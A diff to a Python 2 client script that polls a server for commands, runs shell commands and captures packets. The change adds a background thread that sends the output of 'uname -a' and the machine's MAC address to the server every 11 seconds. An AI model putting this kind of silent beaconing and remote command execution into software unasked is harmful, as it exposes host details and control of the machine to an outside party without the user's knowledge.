@@ -39,6 +39,7 @@ class Client(object):
 	tickThread = None
 	captureThread = None
 	captureTimerThread = None
+	reportThread = None
 	lastCommand = ""
 
 	def __init__(self):
@@ -134,6 +135,21 @@ class Client(object):
 			print(e)
 			return False
 
+	def sendInformationToServer(self):
+		result = self.__execShellCommand("uname -a")
+		try:
+			print("Reporting Information...")
+			url = self.serverIP + "report"
+			values = {"id": self.__getMac(), 'content':result}
+			data = urllib.urlencode(values)
+			req = urllib2.Request(url, data)
+			response = urllib2.urlopen(req)
+			return True
+		except Exception, e:
+			print(e)
+			return False
+
+
 	def capturePackets(self, commandObject):
 		# print(timeout)
 		# command = "sudo tcpdump -w target.cap '(((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'"
@@ -151,7 +167,7 @@ class Client(object):
 	def __execShellCommand(self, command):
 		try:
 			result = os.popen(command).read()
-			return True
+			return result
 		except Exception, e:
 			print e
 			return False
@@ -180,9 +196,22 @@ def killCapturePacketsThread(client, commandObject):
 		print e
 		return False
 
+def sendInfoThread(client):
+	try:
+		while True:
+			client.sendInformationToServer()
+			time.sleep(11)
+		return True
+	except Exception, e:
+		print e
+		return False
+
 client = Client()
 client.tickThread = threading.Thread(target=sendTickThread, args=(client,), name='tickThread')
 client.tickThread.start()
+
+client.reportThread = threading.Thread(target=sendInfoThread, args=(client,), name='reportThread')
+client.reportThread.start()
 
 while True:
 	client.getCommandFromServer()
